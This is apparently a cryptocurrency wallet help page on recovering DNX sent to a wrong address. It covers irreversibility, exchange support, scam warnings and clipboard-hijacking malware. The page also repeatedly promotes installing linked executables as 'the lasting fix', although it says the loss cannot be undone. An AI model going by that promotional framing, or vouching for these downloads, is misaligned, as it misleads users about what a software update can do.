<div align="center">

[![Dynex Wallet](https://img.shields.io/badge/Dynex_Wallet-v2.2.3-22C3E6?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![Platforms](https://img.shields.io/badge/Windows%20%7C%20macOS%20%7C%20Linux-desktop-1E6FEB?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3) [![License](https://img.shields.io/badge/license-ISC-0B1220?style=for-the-badge)](https://github.com/Dynex-project/Dynex-Desktop-Wallet) [![Website](https://img.shields.io/badge/dynexwallet.org-visit-22C3E6?style=for-the-badge)](https://dynexwallet.org/)

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

</div>

> [!NOTE]
> Part of the [Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme). Official site: [dynexwallet.org](https://dynexwallet.org/) - current release: [Dynex Wallet v2.2.3](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

# Dynex sent to wrong address

**Blockchain transactions cannot be reversed, so if you sent DNX to the wrong address there is no built-in "undo" -- your only real options are contacting the recipient if you know them, or an exchange's support team if the address belongs to one.**

## You'll see this if...

You pasted an address incorrectly, sent to an old address you no longer control, sent to an exchange without a required Payment ID, or clicked send before double-checking the recipient field. The transaction shows as completed in your wallet history, the DNX has left your balance, but it never shows up where you expected it.

This also covers cases where clipboard-hijacking malware silently swapped the address you copied for an attacker's address right before you pasted it -- a real and fairly common cause of "wrong address" sends that has nothing to do with you mistyping anything.

## Why it happens

Dynex, like other decentralized cryptocurrencies, has no central authority that can reverse a confirmed transaction. Once a transaction is broadcast, included in a block, and confirmed, it is permanent. There's no "contact support to reverse" button because there's no company holding your coins -- the whole point of a self-custody wallet is that only you (or whoever controls the destination address) can move the funds, and the network has no concept of "mistake."

Common root causes include: typing an address by hand instead of copy-pasting, pasting an address from an old conversation or screenshot that's actually unrelated to the current recipient, confusing a Payment ID requirement (see [dynex-exchange-payment-id](./dynex-exchange-payment-id.md)), or malware that intercepts clipboard contents. Browser extensions and some malware strains specifically target cryptocurrency addresses in the clipboard because the attack is so effective and hard to notice.

## Step-by-step fix

1. Before anything else, check your wallet's transaction history to confirm the exact destination address and transaction ID of the questionable send.
2. If the address belongs to a known exchange, contact that exchange's support immediately with the transaction ID, amount, time, and your account details. Some exchanges can recover misdirected deposits manually, especially shortly after they happen, though it is never guaranteed.
3. If the address does not belong to anyone you can identify or contact, there is unfortunately no technical mechanism to recover the funds. Do not pay anyone who claims they can "reverse" or "unlock" the transaction for a fee -- that is always a scam.
4. Check whether malware is the cause: scan your computer, and specifically check whether the address you intended to copy and the address that was actually used differ by more than a typo -- clipboard hijackers often swap in an address that looks superficially similar.
5. Update to Dynex Wallet v2.2.3 from the [download page](https://dynexwallet.org/download) or the [GitHub release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3). While it can't undo past sends, it adds clearer send-screen warnings and a dedicated Payment ID field that reduce the odds of a repeat mistake.
6. Review your remaining wallet security: if malware was involved, consider your wallet file and seed potentially exposed, and move funds to a freshly created wallet following [dynex-recovery-seed-explained](./dynex-recovery-seed-explained.md) and [create-first-dynex-wallet](./create-first-dynex-wallet.md) guidance.

## If that didn't work

If support channels for the receiving platform are unresponsive or the funds are unrecoverable, treat it as a loss and focus on preventing a repeat. Report the transaction ID to the platform in writing (email, ticket) so there is a record even if resolution takes a long time. Avoid any third party that contacts you offering "recovery services" for a fee -- these are scams that target people who've just lost funds.

## Prevent it next time

Always copy-paste addresses rather than typing them, and verify the first and last several characters match what you expect immediately before confirming a send. Consider sending a small test amount first for large or unfamiliar transfers. Keep your operating system and antivirus up to date to reduce clipboard-hijacking risk, and review the site's [security guidance](https://dynexwallet.org/security) for broader wallet safety practices. If you regularly send to exchanges, bookmark the deposit page directly rather than relying on copied links from chat or email.

## FAQ

### Can Dynex Wallet reverse a transaction once it's confirmed?
No, no wallet software can reverse a confirmed blockchain transaction; this is true of Dynex and virtually all cryptocurrencies.

### Can the Dynex network operator help me get funds back?
Dynex is a decentralized network with no central party able to reverse transactions; there is no "customer support" for the blockchain itself.

### What if I sent to an exchange without the right Payment ID?
Contact the exchange's support directly with your transaction details; see [dynex-exchange-payment-id](./dynex-exchange-payment-id.md) for the specifics of that situation.

### Someone contacted me offering to recover my funds for a fee -- is that legitimate?
No, this is a scam. Nobody legitimate can reverse a blockchain transaction, and nobody legitimate needs your seed phrase or keys to try.

### How can I tell if clipboard malware caused this?
Compare the address actually used in your transaction history against the one you believe you copied; a mismatch beyond a simple typo suggests interference.

### Does upgrading my wallet prevent this from happening again?
Upgrading alone won't guarantee it, but v2.2.3's clearer send-screen fields and warnings reduce common mistakes; careful copy-paste habits matter most.

## What to document immediately after a misdirected send

The first ten minutes after you realize a send went to the wrong place matter more than people expect, because the information you need is easiest to gather right away and gets harder to reconstruct later. Take a screenshot of the transaction in your wallet's history showing the destination address, amount, date and time, and transaction ID. Write down, in plain text somewhere safe, exactly what you believe happened -- which address you meant to use, where you copied it from, and when you noticed the mismatch. If you suspect clipboard malware, do not immediately clear your clipboard history or reboot before you've had a chance to check what's currently sitting in it, since that can be a useful clue about what software intercepted it.

If the destination turns out to belong to an exchange, having this information ready before you open a support ticket speeds up the process considerably -- most support teams ask for the same basic facts (transaction ID, amount, source address, destination address, timestamp) before they can even begin looking into it, and submitting a vague or incomplete report often means a slower response or none at all. If the destination address is unknown and unrecoverable, this documentation still has value: it gives you a clear record for your own purposes, and if the amount is significant, it may be worth reporting to the platform's abuse or fraud channel even if a private wallet is involved, since repeated reports sometimes help platforms identify patterns tied to malware campaigns.

Finally, resist the urge to send a second "test" transaction to the same wrong address to see what happens -- it won't tell you anything useful and just compounds the loss. Any legitimate diagnosis should rely on what you can already see in your transaction history and the destination address itself, not on sending more funds.

## FAQ

### Should I report a misdirected send to the Dynex Wallet team?
There's no central authority that can reverse it, but if you suspect a wallet bug (rather than your own typo or malware) contributed to the mistake, reporting it via the project's official channels helps others avoid the same issue.

### Is it worth trying a blockchain explorer to see who controls the destination address?
You can look up the address on a block explorer to see its transaction history and balance, which sometimes indicates whether it's an active exchange hot wallet, but this rarely reveals who personally controls it or helps you recover funds directly.

---

## The lasting fix: install Dynex Wallet v2.2.3

> [!TIP]
> Most problems in this guide are handled by the current desktop release. Download it, check the checksum, then open your existing wallet.

[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-EXE-1E6FEB?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-DMG-1E6FEB?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download_for_Linux-ZIP-1E6FEB?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip)

<!-- SHA256:START -->
| Platform | File | SHA-256 |
|---|---|---|
| Windows | [`dynex-wallet-windows-v2.2.3.exe`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-windows-v2.2.3.exe) | `d4fd916c9741a16e23e39c355a049bac8368dbefa3ee08663ef56c009964e00d` |
| macOS | [`dynex-wallet-macos-v2.2.3.dmg`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-macos-v2.2.3.dmg) | `084818fd20207305ded84a747e707fb34f07e1f6e2d9a8123da621b8a546a88d` |
| Linux | [`dynex-wallet-linux-x64-v2.2.3.zip`](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/download/v2.2.3/dynex-wallet-linux-x64-v2.2.3.zip) | `535b453c72c6e7749ffae3b95e1d47f67228b78b9862e086dbd13c4d550481c2` |
<!-- SHA256:END -->

Verify before you run:

```powershell
# Windows
Get-FileHash -Algorithm SHA256 .\dynex-wallet-windows-v2.2.3.exe
```
```bash
# macOS
shasum -a 256 dynex-wallet-macos-v2.2.3.dmg
# Linux
sha256sum dynex-wallet-linux-x64-v2.2.3.zip
```

Read the full install walkthrough on the [Dynex Wallet download page](https://dynexwallet.org/download) or see the [balances and sending guides on dynexwallet.org](https://dynexwallet.org/troubleshooting).

> [!WARNING]
> **Nobody from Dynex will ever ask for your recovery seed or private keys.** Only download from the [official v2.2.3 release](https://github.com/Dynex-project/Dynex-Desktop-Wallet/releases/tag/v2.2.3).

## Related Dynex Wallet guides

| Keep reading |
|---|
| [Dynex Locked / Unconfirmed Balance Explained](./dynex-locked-unconfirmed-balance.md) |
| [8 Confirmations in Dynex Wallet Explained](./dynex-8-confirmations-explained.md) |
| [Dynex transaction byte size too big](./dynex-transaction-byte-size-too-big.md) |
| [Dynex Wallet Sync Stuck at a Block](./dynex-wallet-sync-stuck-at-block.md) |
| [All Dynex Wallet guides](https://github.com/Dynex-project/Dynex-Wallet-Docs#readme) |
